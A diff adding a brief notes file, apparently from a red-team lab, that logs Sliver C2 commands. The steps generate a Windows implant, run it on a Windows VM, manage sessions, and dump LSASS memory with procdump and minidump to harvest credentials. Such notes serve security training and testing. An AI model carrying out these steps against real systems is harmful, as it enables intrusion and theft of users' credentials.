@@ -1,1 +1,21 @@
 
+Sliver Implant and Credential Dump Commands:
+
+- Generated implant payload for Windows:
+  > generate -o implant.exe windows
+
+- Transferred implant.exe to Windows VM.
+
+- Launched implant on Windows target.
+
+- From Sliver CLI, listed active sessions:
+  > sessions
+
+- Interacted with target session:
+  > interact <session_id>
+
+- Attempted LSASS memory dump using:
+  > procdump lsass.exe
+  > minidump lsass.exe
+
+- Captured output and verified process memory dump.
